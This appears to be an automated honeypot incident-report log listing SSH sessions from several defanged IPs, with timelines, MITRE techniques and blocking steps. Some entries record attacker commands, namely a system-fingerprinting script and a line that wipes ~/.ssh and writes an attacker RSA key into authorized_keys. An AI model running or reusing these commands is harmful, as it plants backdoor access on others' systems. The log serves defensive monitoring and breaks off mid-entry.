| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:54:21` | `cowrie.session.connect` |
| `2026-07-06 05:54:22` | `cowrie.client.version` |
| `2026-07-06 05:54:22` | `cowrie.client.kex` |
| `2026-07-06 05:54:25` | `cowrie.login.success` |
| `2026-07-06 05:54:27` | `cowrie.session.params` |
| `2026-07-06 05:54:27` | `cowrie.command.input` |
| `2026-07-06 05:54:27` | `cowrie.command.input` |
| `2026-07-06 05:54:27` | `cowrie.command.input` |
| `2026-07-06 05:54:27` | `cowrie.command.input` |
| `2026-07-06 05:54:27` | `cowrie.command.input` |
| `2026-07-06 05:54:27` | `cowrie.command.success` |
| `2026-07-06 05:54:27` | `cowrie.command.input` |
| `2026-07-06 05:54:27` | `cowrie.command.input` |
| `2026-07-06 05:54:27` | `cowrie.command.input` |
| `2026-07-06 05:54:27` | `cowrie.command.input` |
| `2026-07-06 05:54:28` | `cowrie.log.closed` |
| `2026-07-06 05:54:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cad9e2aa5eb6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:55 |
| **Last Seen** | 2026-07-06 05:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:55:08` | `cowrie.session.connect` |
| `2026-07-06 05:55:09` | `cowrie.client.version` |
| `2026-07-06 05:55:09` | `cowrie.client.kex` |
| `2026-07-06 05:55:12` | `cowrie.login.success` |
| `2026-07-06 05:55:14` | `cowrie.session.params` |
| `2026-07-06 05:55:14` | `cowrie.command.input` |
| `2026-07-06 05:55:14` | `cowrie.command.input` |
| `2026-07-06 05:55:14` | `cowrie.command.input` |
| `2026-07-06 05:55:14` | `cowrie.command.input` |
| `2026-07-06 05:55:14` | `cowrie.command.input` |
| `2026-07-06 05:55:14` | `cowrie.command.success` |
| `2026-07-06 05:55:14` | `cowrie.command.input` |
| `2026-07-06 05:55:14` | `cowrie.command.input` |
| `2026-07-06 05:55:14` | `cowrie.command.input` |
| `2026-07-06 05:55:14` | `cowrie.command.input` |
| `2026-07-06 05:55:15` | `cowrie.log.closed` |
| `2026-07-06 05:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47d0d88ded0d

| Field | Detail |
|---|---|
| **Source IP** | `45.70.164[.]151` |
| **First Seen** | 2026-07-06 05:55 |
| **Last Seen** | 2026-07-06 05:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:55:44` | `cowrie.session.connect` |
| `2026-07-06 05:55:44` | `cowrie.client.version` |
| `2026-07-06 05:55:44` | `cowrie.client.kex` |
| `2026-07-06 05:55:45` | `cowrie.login.success` |
| `2026-07-06 05:55:46` | `cowrie.session.params` |
| `2026-07-06 05:55:46` | `cowrie.command.input` |
| `2026-07-06 05:55:46` | `cowrie.command.failed` |
| `2026-07-06 05:55:46` | `cowrie.log.closed` |
| `2026-07-06 05:55:47` | `cowrie.session.params` |
| `2026-07-06 05:55:47` | `cowrie.command.input` |
| `2026-07-06 05:55:47` | `cowrie.session.file_download` |
| `2026-07-06 05:55:47` | `cowrie.log.closed` |
| `2026-07-06 05:55:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.70.164[.]151` to AbuseIPDB if not already reported
- [ ] Block `45.70.164[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15f716542d97

| Field | Detail |
|---|---|
| **Source IP** | `45.70.164[.]151` |
| **First Seen** | 2026-07-06 05:55 |
| **Last Seen** | 2026-07-06 05:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:55:48` | `cowrie.session.connect` |
| `2026-07-06 05:55:48` | `cowrie.client.version` |
| `2026-07-06 05:55:48` | `cowrie.client.kex` |
| `2026-07-06 05:55:49` | `cowrie.login.success` |
| `2026-07-06 05:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.70.164[.]151` to AbuseIPDB if not already reported
- [ ] Block `45.70.164[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-870c2d21135f

| Field | Detail |
|---|---|
| **Source IP** | `45.70.164[.]151` |
| **First Seen** | 2026-07-06 05:55 |
| **Last Seen** | 2026-07-06 05:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:55:49` | `cowrie.session.connect` |
| `2026-07-06 05:55:49` | `cowrie.client.version` |
| `2026-07-06 05:55:49` | `cowrie.client.kex` |
| `2026-07-06 05:55:50` | `cowrie.login.success` |
| `2026-07-06 05:55:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.70.164[.]151` to AbuseIPDB if not already reported
- [ ] Block `45.70.164[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73fc6dc238bf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:55 |
| **Last Seen** | 2026-07-06 05:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:55:57` | `cowrie.session.connect` |
| `2026-07-06 05:55:58` | `cowrie.client.version` |
| `2026-07-06 05:55:58` | `cowrie.client.kex` |
| `2026-07-06 05:56:00` | `cowrie.login.success` |
| `2026-07-06 05:56:02` | `cowrie.session.params` |
| `2026-07-06 05:56:02` | `cowrie.command.input` |
| `2026-07-06 05:56:02` | `cowrie.command.input` |
| `2026-07-06 05:56:02` | `cowrie.command.input` |
| `2026-07-06 05:56:02` | `cowrie.command.input` |
| `2026-07-06 05:56:02` | `cowrie.command.input` |
| `2026-07-06 05:56:02` | `cowrie.command.success` |
| `2026-07-06 05:56:02` | `cowrie.command.input` |
| `2026-07-06 05:56:02` | `cowrie.command.input` |
| `2026-07-06 05:56:02` | `cowrie.command.input` |
| `2026-07-06 05:56:02` | `cowrie.command.input` |
| `2026-07-06 05:56:03` | `cowrie.log.closed` |
| `2026-07-06 05:56:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-443c715e1d89

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 05:56 |
| **Last Seen** | 2026-07-06 05:56 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:56:16` | `cowrie.session.connect` |
| `2026-07-06 05:56:18` | `cowrie.client.version` |
| `2026-07-06 05:56:18` | `cowrie.client.kex` |
| `2026-07-06 05:56:23` | `cowrie.login.success` |
| `2026-07-06 05:56:27` | `cowrie.session.params` |
| `2026-07-06 05:56:27` | `cowrie.command.input` |
| `2026-07-06 05:56:29` | `cowrie.log.closed` |
| `2026-07-06 05:56:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d202bb950083

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:56 |
| **Last Seen** | 2026-07-06 05:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:56:45` | `cowrie.session.connect` |
| `2026-07-06 05:56:46` | `cowrie.client.version` |
| `2026-07-06 05:56:46` | `cowrie.client.kex` |
| `2026-07-06 05:56:48` | `cowrie.login.success` |
| `2026-07-06 05:56:50` | `cowrie.session.params` |
| `2026-07-06 05:56:50` | `cowrie.command.input` |
| `2026-07-06 05:56:50` | `cowrie.command.input` |
| `2026-07-06 05:56:50` | `cowrie.command.input` |
| `2026-07-06 05:56:50` | `cowrie.command.input` |
| `2026-07-06 05:56:50` | `cowrie.command.input` |
| `2026-07-06 05:56:50` | `cowrie.command.success` |
| `2026-07-06 05:56:50` | `cowrie.command.input` |
| `2026-07-06 05:56:50` | `cowrie.command.input` |
| `2026-07-06 05:56:50` | `cowrie.command.input` |
| `2026-07-06 05:56:50` | `cowrie.command.input` |
| `2026-07-06 05:56:51` | `cowrie.log.closed` |
| `2026-07-06 05:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0816be274fb5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:57 |
| **Last Seen** | 2026-07-06 05:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:57:33` | `cowrie.session.connect` |
| `2026-07-06 05:57:34` | `cowrie.client.version` |
| `2026-07-06 05:57:34` | `cowrie.client.kex` |
| `2026-07-06 05:57:37` | `cowrie.login.success` |
| `2026-07-06 05:57:39` | `cowrie.session.params` |
| `2026-07-06 05:57:39` | `cowrie.command.input` |
| `2026-07-06 05:57:39` | `cowrie.command.input` |
| `2026-07-06 05:57:39` | `cowrie.command.input` |
| `2026-07-06 05:57:39` | `cowrie.command.input` |
| `2026-07-06 05:57:39` | `cowrie.command.input` |
| `2026-07-06 05:57:39` | `cowrie.command.success` |
| `2026-07-06 05:57:39` | `cowrie.command.input` |
| `2026-07-06 05:57:39` | `cowrie.command.input` |
| `2026-07-06 05:57:39` | `cowrie.command.input` |
| `2026-07-06 05:57:39` | `cowrie.command.input` |
| `2026-07-06 05:57:39` | `cowrie.log.closed` |
| `2026-07-06 05:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f400693447a3

| Field | Detail |
|---|---|
| **Source IP** | `120.48.181[.]192` |
| **First Seen** | 2026-07-06 05:57 |
| **Last Seen** | 2026-07-06 05:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:57:38` | `cowrie.session.connect` |
| `2026-07-06 05:57:38` | `cowrie.client.version` |
| `2026-07-06 05:57:38` | `cowrie.client.kex` |
| `2026-07-06 05:57:39` | `cowrie.login.success` |
| `2026-07-06 05:57:41` | `cowrie.session.params` |
| `2026-07-06 05:57:41` | `cowrie.command.input` |
| `2026-07-06 05:57:41` | `cowrie.command.failed` |
| `2026-07-06 05:57:42` | `cowrie.log.closed` |
| `2026-07-06 05:57:43` | `cowrie.session.params` |
| `2026-07-06 05:57:43` | `cowrie.command.input` |
| `2026-07-06 05:57:43` | `cowrie.session.file_download` |
| `2026-07-06 05:57:43` | `cowrie.log.closed` |
| `2026-07-06 05:57:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.181[.]192` to AbuseIPDB if not already reported
- [ ] Block `120.48.181[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca86efb085dd

| Field | Detail |
|---|---|
| **Source IP** | `120.48.181[.]192` |
| **First Seen** | 2026-07-06 05:57 |
| **Last Seen** | 2026-07-06 05:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:57:43` | `cowrie.session.connect` |
| `2026-07-06 05:57:43` | `cowrie.client.version` |
| `2026-07-06 05:57:43` | `cowrie.client.kex` |
| `2026-07-06 05:57:44` | `cowrie.login.success` |
| `2026-07-06 05:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.181[.]192` to AbuseIPDB if not already reported
- [ ] Block `120.48.181[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0aedf9b2189

| Field | Detail |
|---|---|
| **Source IP** | `120.48.181[.]192` |
| **First Seen** | 2026-07-06 05:57 |
| **Last Seen** | 2026-07-06 05:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:57:46` | `cowrie.session.connect` |
| `2026-07-06 05:57:46` | `cowrie.client.version` |
| `2026-07-06 05:57:46` | `cowrie.client.kex` |
| `2026-07-06 05:57:47` | `cowrie.login.success` |
| `2026-07-06 05:57:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.181[.]192` to AbuseIPDB if not already reported
- [ ] Block `120.48.181[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e12daed4136

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:58 |
| **Last Seen** | 2026-07-06 05:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:58:21` | `cowrie.session.connect` |
| `2026-07-06 05:58:21` | `cowrie.client.version` |
| `2026-07-06 05:58:21` | `cowrie.client.kex` |
| `2026-07-06 05:58:25` | `cowrie.login.success` |
| `2026-07-06 05:58:27` | `cowrie.session.params` |
| `2026-07-06 05:58:27` | `cowrie.command.input` |
| `2026-07-06 05:58:27` | `cowrie.command.input` |
| `2026-07-06 05:58:27` | `cowrie.command.input` |
| `2026-07-06 05:58:27` | `cowrie.command.input` |
| `2026-07-06 05:58:27` | `cowrie.command.input` |
| `2026-07-06 05:58:27` | `cowrie.command.success` |
| `2026-07-06 05:58:27` | `cowrie.command.input` |
| `2026-07-06 05:58:27` | `cowrie.command.input` |
| `2026-07-06 05:58:27` | `cowrie.command.input` |
| `2026-07-06 05:58:27` | `cowrie.command.input` |
| `2026-07-06 05:58:27` | `cowrie.log.closed` |
| `2026-07-06 05:58:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c50c42ba2a5b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:59 |
| **Last Seen** | 2026-07-06 05:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:59:08` | `cowrie.session.connect` |
| `2026-07-06 05:59:08` | `cowrie.client.version` |
| `2026-07-06 05:59:08` | `cowrie.client.kex` |
| `2026-07-06 05:59:12` | `cowrie.login.success` |
| `2026-07-06 05:59:14` | `cowrie.session.params` |
| `2026-07-06 05:59:14` | `cowrie.command.input` |
| `2026-07-06 05:59:14` | `cowrie.command.input` |
| `2026-07-06 05:59:14` | `cowrie.command.input` |
| `2026-07-06 05:59:14` | `cowrie.command.input` |
| `2026-07-06 05:59:14` | `cowrie.command.input` |
| `2026-07-06 05:59:14` | `cowrie.command.success` |
| `2026-07-06 05:59:14` | `cowrie.command.input` |
| `2026-07-06 05:59:14` | `cowrie.command.input` |
| `2026-07-06 05:59:14` | `cowrie.command.input` |
| `2026-07-06 05:59:14` | `cowrie.command.input` |
| `2026-07-06 05:59:15` | `cowrie.log.closed` |
| `2026-07-06 05:59:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4eb4ab981b98

| Field | Detail |
|---|---|
| **Source IP** | `207.175.6[.]167` |
| **First Seen** | 2026-07-06 05:59 |
| **Last Seen** | 2026-07-06 05:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:59:52` | `cowrie.session.connect` |
| `2026-07-06 05:59:52` | `cowrie.client.version` |
| `2026-07-06 05:59:52` | `cowrie.client.kex` |
| `2026-07-06 05:59:54` | `cowrie.login.success` |
| `2026-07-06 05:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.6[.]167` to AbuseIPDB if not already reported
- [ ] Block `207.175.6[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9164a77772d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:59 |
| **Last Seen** | 2026-07-06 06:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:59:55` | `cowrie.session.connect` |
| `2026-07-06 05:59:55` | `cowrie.client.version` |
| `2026-07-06 05:59:55` | `cowrie.client.kex` |
| `2026-07-06 05:59:59` | `cowrie.login.success` |
| `2026-07-06 06:00:01` | `cowrie.session.params` |
| `2026-07-06 06:00:01` | `cowrie.command.input` |
| `2026-07-06 06:00:01` | `cowrie.command.input` |
| `2026-07-06 06:00:01` | `cowrie.command.input` |
| `2026-07-06 06:00:01` | `cowrie.command.input` |
| `2026-07-06 06:00:01` | `cowrie.command.input` |
| `2026-07-06 06:00:01` | `cowrie.command.success` |
| `2026-07-06 06:00:01` | `cowrie.command.input` |
| `2026-07-06 06:00:01` | `cowrie.command.input` |
| `2026-07-06 06:00:01` | `cowrie.command.input` |
| `2026-07-06 06:00:01` | `cowrie.command.input` |
| `2026-07-06 06:00:01` | `cowrie.log.closed` |
| `2026-07-06 06:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b833f138eecd

| Field | Detail |
|---|---|
| **Source IP** | `38.224.49[.]7` |
| **First Seen** | 2026-07-06 06:00 |
| **Last Seen** | 2026-07-06 06:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
